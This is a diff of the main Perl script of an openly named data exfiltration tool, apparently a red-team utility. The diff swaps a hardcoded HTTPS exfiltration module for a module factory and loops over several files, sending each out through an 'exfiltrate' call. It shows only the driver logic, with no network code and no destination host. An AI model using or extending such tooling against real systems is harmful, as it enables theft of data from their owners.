@@ -1,11 +1,13 @@
 #!/usr/bin/perl
 
+use Parallel::ForkManager;
 use strict;
-use threads;
+# use threads;
+# use Thread::Queue;
 use warnings;
 
+require Entity::ModuleFactory;
 require Entity::Parser;
-require Module::HTTPSExfiltration;
 
 print "
              ________  .____   __________
@@ -22,25 +24,39 @@ Maintained by Nitrax <nitrax\@lokisec.fr>
 
 ";
 
-my $engine;
 my $parser = Parser->new();
 
 $parser->parse(@ARGV);
 
-my @factory = (
-    { name => 'HTTPS', className => 'HTTPSExfiltration' }
-);
+my $pm = new Parallel::ForkManager(30);
+my $engine =  ModuleFactory->new()->create($parser);
 
-for my $method (@factory) {
-    if ($method->{name} eq $parser->method) {
-        $engine = $method->{className}->new(dest => $parser->dest, delay => $parser->delay, size => $parser->size);
-
-        last;
-    }
+foreach my $file ($parser->getFiles) {
+    $engine->exfiltrate($file);
 }
 
-my $thr = threads->create(sub {
-    $engine->exfiltrate($parser->file)
-});
+# my $q = Thread::Queue->new();
+#
+# $q->enqueue($_) for $parser->getFiles;
+#
+# my @thr = map {
+#     threads->create(sub {
+#         while (defined(my $file = $q->dequeue_nb())) {
+#             my $engine = ModuleFactory->new()->create($parser);
+#
+#             $engine->exfiltrate($file)
+#         }
+#     });
+# }1..scalar $parser->getFiles;
+#
+# $_->join() for @thr;
 
-$thr->join();
+# foreach my $file ($parser->getFiles) {
+#     # my $thr = threads->create(sub {
+#     #     $engine->exfiltrate($file)
+#     # });
+#     #
+#     # $thr->join();
+#     my $thr = async { $engine->exfiltrate($file) };
+#     $thr->join();
+# }
